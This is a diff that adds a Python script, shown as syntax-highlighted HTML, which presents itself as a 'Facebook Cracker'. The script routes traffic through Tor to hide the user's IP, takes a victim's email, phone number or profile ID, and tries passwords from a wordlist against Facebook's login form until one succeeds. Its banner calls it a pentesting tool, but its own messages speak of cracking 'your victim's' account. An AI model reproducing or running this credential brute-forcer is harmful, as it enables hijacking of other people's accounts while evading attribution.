@@ -1,0 +1,120 @@
+<span class="kw1">import</span> <span class="kw3">urllib2</span>
+<span class="kw1">import</span> <span class="kw3">urllib</span>
+<span class="kw1">import</span> json
+<span class="kw1">import</span> <span class="kw3">socket</span>
+<span class="kw1">import</span> socks
+&nbsp;
+<span class="kw1">import</span> <span class="kw3">sys</span>
+<span class="kw1">import</span> <span class="kw3">random</span>
+<span class="kw1">import</span> mechanize
+<span class="kw1">import</span> <span class="kw3">cookielib</span>
+&nbsp;
+ipcheck_url <span class="sy0">=</span> <span class="st0">'http://checkip.amazonaws.com/'</span>
+<span class="co1"># Actual IP.</span>
+<span class="kw1">print</span> <span class="st0">&quot;That is the Reail WAN IP :&quot;</span> + <span class="kw3">urllib2</span>.<span class="me1">urlopen</span><span class="br0">&#40;</span>ipcheck_url<span class="br0">&#41;</span>.<span class="me1">read</span><span class="br0">&#40;</span><span class="br0">&#41;</span> 
+<span class="co1"># Tor IP.</span>
+socks.<span class="me1">setdefaultproxy</span><span class="br0">&#40;</span>socks.<span class="me1">PROXY_TYPE_SOCKS5</span><span class="sy0">,</span> <span class="st0">'127.0.0.1'</span><span class="sy0">,</span> <span class="nu0">9050</span><span class="br0">&#41;</span>
+<span class="kw3">socket</span>.<span class="kw3">socket</span> <span class="sy0">=</span> socks.<span class="me1">socksocket</span>
+<span class="kw1">print</span> <span class="st0">&quot;That is the Attack Tor IP :&quot;</span> + <span class="kw3">urllib2</span>.<span class="me1">urlopen</span><span class="br0">&#40;</span>ipcheck_url<span class="br0">&#41;</span>.<span class="me1">read</span><span class="br0">&#40;</span><span class="br0">&#41;</span> 
+&nbsp;
+<span class="co1">#data = json.loads(urllib.urlopen(&quot;http://ip.jsontest.com/&quot;).read())</span>
+<span class="co1">#print data[&quot;ip&quot;]</span>
+&nbsp;
+<span class="co1">#----------------------------------------------------------------------------------------</span>
+&nbsp;
+&nbsp;
+GHT <span class="sy0">=</span> <span class="st0">'''
+        +=======================================+
+        |..........Facebook Cracker v 2.........|
+        +---------------------------------------+
+        |#Author: Mauritania Attacker           |
+        |#Contact: www.fb.com/mauritanie.forever|
+        |#Date: 02/04/2013                      |
+        |#Modify: JonnyBravo Date:09/08/2016    |
+        |#This tool is made for pentesting.     |
+        |#Changing the Description of this tool |
+        |Won't made you the coder ^_^ !!!       |
+        |#Respect Coderz ^_^                    |
+        |#I take no responsibilities for the    |
+        |  use of this program !                |
+        +=======================================+
+        |..........Facebook Cracker v 2.........|
+        +---------------------------------------+
+'''</span>
+<span class="kw1">print</span> <span class="st0">&quot;Note: - This tool can crack facebook account even if you don't have the email of your victim&quot;</span>
+<span class="kw1">print</span> <span class="st0">&quot;# Hit CTRL+C to quit the program&quot;</span>
+<span class="kw1">print</span> <span class="st0">&quot;# Use www.graph.facebook.com for more infos about your victim ^_^&quot;</span>
+<span class="kw3">email</span> <span class="sy0">=</span> <span class="kw2">str</span><span class="br0">&#40;</span><span class="kw2">raw_input</span><span class="br0">&#40;</span><span class="st0">&quot;# Enter |Email| |Phone number| |Profile ID number| |Username| : &quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+passwordlist <span class="sy0">=</span> <span class="kw2">str</span><span class="br0">&#40;</span><span class="kw2">raw_input</span><span class="br0">&#40;</span><span class="st0">&quot;Enter the name of the password list file : &quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+useragents <span class="sy0">=</span> <span class="br0">&#91;</span><span class="br0">&#40;</span><span class="st0">'User-agent'</span><span class="sy0">,</span> <span class="st0">'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'</span><span class="br0">&#41;</span><span class="br0">&#93;</span>
+login <span class="sy0">=</span> <span class="st0">'https://www.facebook.com/login.php?login_attempt=1&amp;lwv=100'</span>
+<span class="kw1">def</span> attack<span class="br0">&#40;</span>password<span class="br0">&#41;</span>:
+  <span class="kw1">try</span>:
+     <span class="kw3">sys</span>.<span class="me1">stdout</span>.<span class="me1">write</span><span class="br0">&#40;</span><span class="st0">&quot;<span class="es0">\r</span>[*] trying %s.. &quot;</span> % password<span class="br0">&#41;</span>
+     <span class="kw3">sys</span>.<span class="me1">stdout</span>.<span class="me1">flush</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+     br.<span class="me1">addheaders</span> <span class="sy0">=</span> <span class="br0">&#91;</span><span class="br0">&#40;</span><span class="st0">'User-agent'</span><span class="sy0">,</span> <span class="kw3">random</span>.<span class="me1">choice</span><span class="br0">&#40;</span>useragents<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#93;</span>
+     <span class="kw3">site</span> <span class="sy0">=</span> br.<span class="kw2">open</span><span class="br0">&#40;</span>login<span class="br0">&#41;</span>
+     br.<span class="me1">select_form</span><span class="br0">&#40;</span>nr<span class="sy0">=</span><span class="nu0">0</span><span class="br0">&#41;</span>
+     <span class="kw1">print</span> <span class="st0">&quot;cHECK &quot;</span> +  password 
+     <span class="co1">##Facebook</span>
+     br.<span class="me1">form</span><span class="br0">&#91;</span><span class="st0">'email'</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="kw3">email</span>
+     br.<span class="me1">form</span><span class="br0">&#91;</span><span class="st0">'pass'</span><span class="br0">&#93;</span> <span class="sy0">=</span> password
+     br.<span class="me1">submit</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+     log <span class="sy0">=</span> br.<span class="me1">geturl</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+    <span class="co1"># print log</span>
+    <span class="co1"># print login</span>
+     <span class="kw1">if</span> log <span class="sy0">!=</span> login:
+        <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span><span class="es0">\n</span><span class="es0">\n</span> [*] Password found .. !!&quot;</span>
+        <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span> [*] Password : %s<span class="es0">\n</span>&quot;</span> % <span class="br0">&#40;</span>password<span class="br0">&#41;</span>
+        <span class="kw3">sys</span>.<span class="me1">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+  <span class="kw1">except</span> <span class="kw2">KeyboardInterrupt</span>:
+        <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span>[*] Exiting program .. &quot;</span>
+        <span class="kw3">sys</span>.<span class="me1">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+<span class="kw1">def</span> search<span class="br0">&#40;</span><span class="br0">&#41;</span>:
+    <span class="kw1">global</span> password
+    <span class="kw1">for</span> password <span class="kw1">in</span> passwords:
+        attack<span class="br0">&#40;</span>password.<span class="me1">replace</span><span class="br0">&#40;</span><span class="st0">&quot;<span class="es0">\n</span>&quot;</span><span class="sy0">,</span><span class="st0">&quot;&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+<span class="kw1">def</span> check<span class="br0">&#40;</span><span class="br0">&#41;</span>:
+    <span class="kw1">global</span> br
+    <span class="kw1">global</span> passwords
+    <span class="kw1">try</span>:
+       br <span class="sy0">=</span> mechanize.<span class="me1">Browser</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+       cj <span class="sy0">=</span> <span class="kw3">cookielib</span>.<span class="me1">LWPCookieJar</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+       br.<span class="me1">set_handle_robots</span><span class="br0">&#40;</span><span class="kw2">False</span><span class="br0">&#41;</span>
+       br.<span class="me1">set_handle_equiv</span><span class="br0">&#40;</span><span class="kw2">True</span><span class="br0">&#41;</span>
+       br.<span class="me1">set_handle_referer</span><span class="br0">&#40;</span><span class="kw2">True</span><span class="br0">&#41;</span>
+       br.<span class="me1">set_handle_redirect</span><span class="br0">&#40;</span><span class="kw2">True</span><span class="br0">&#41;</span>
+       br.<span class="me1">set_cookiejar</span><span class="br0">&#40;</span>cj<span class="br0">&#41;</span>
+       br.<span class="me1">set_handle_refresh</span><span class="br0">&#40;</span>mechanize._http.<span class="me1">HTTPRefreshProcessor</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">,</span> max_time<span class="sy0">=</span><span class="nu0">1</span><span class="br0">&#41;</span>
+    <span class="kw1">except</span> <span class="kw2">KeyboardInterrupt</span>:
+       <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span>[*] Exiting program ..<span class="es0">\n</span>&quot;</span>
+       <span class="kw3">sys</span>.<span class="me1">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+    <span class="kw1">try</span>:
+       <span class="kw2">list</span> <span class="sy0">=</span> <span class="kw2">open</span><span class="br0">&#40;</span>passwordlist<span class="sy0">,</span> <span class="st0">&quot;r&quot;</span><span class="br0">&#41;</span>
+       passwords <span class="sy0">=</span> <span class="kw2">list</span>.<span class="me1">readlines</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+       k <span class="sy0">=</span> <span class="nu0">0</span>
+       <span class="kw1">while</span> k <span class="sy0">&lt;</span> <span class="kw2">len</span><span class="br0">&#40;</span>passwords<span class="br0">&#41;</span>:
+          passwords<span class="br0">&#91;</span>k<span class="br0">&#93;</span> <span class="sy0">=</span> passwords<span class="br0">&#91;</span>k<span class="br0">&#93;</span>.<span class="me1">strip</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+          k +<span class="sy0">=</span> <span class="nu0">1</span>
+    <span class="kw1">except</span> <span class="kw2">IOError</span>:
+        <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span> [*] Error: check your password list path <span class="es0">\n</span>&quot;</span>
+        <span class="kw3">sys</span>.<span class="me1">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+    <span class="kw1">except</span> <span class="kw2">KeyboardInterrupt</span>:
+        <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span> [*] Exiting program ..<span class="es0">\n</span>&quot;</span>
+        <span class="kw3">sys</span>.<span class="me1">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+    <span class="kw1">try</span>:
+        <span class="kw1">print</span> GHT
+        <span class="kw1">print</span> <span class="st0">&quot; [*] Account to crack : %s&quot;</span> % <span class="br0">&#40;</span><span class="kw3">email</span><span class="br0">&#41;</span>
+        <span class="kw1">print</span> <span class="st0">&quot; [*] Loaded :&quot;</span> <span class="sy0">,</span> <span class="kw2">len</span><span class="br0">&#40;</span>passwords<span class="br0">&#41;</span><span class="sy0">,</span> <span class="st0">&quot;passwords&quot;</span>
+        <span class="kw1">print</span> <span class="st0">&quot; [*] Cracking, please wait ...&quot;</span>
+    <span class="kw1">except</span> <span class="kw2">KeyboardInterrupt</span>:
+        <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span> [*] Exiting program ..<span class="es0">\n</span>&quot;</span>
+        <span class="kw3">sys</span>.<span class="me1">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+    <span class="kw1">try</span>:
+        search<span class="br0">&#40;</span><span class="br0">&#41;</span>
+        attack<span class="br0">&#40;</span>password<span class="br0">&#41;</span>
+    <span class="kw1">except</span> <span class="kw2">KeyboardInterrupt</span>:
+        <span class="kw1">print</span> <span class="st0">&quot;<span class="es0">\n</span> [*] Exiting program ..<span class="es0">\n</span>&quot;</span>
+        <span class="kw3">sys</span>.<span class="me1">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+<span class="kw1">if</span> __name__ <span class="sy0">==</span> <span class="st0">'__main__'</span>:
+    check<span class="br0">&#40;</span><span class="br0">&#41;</span>
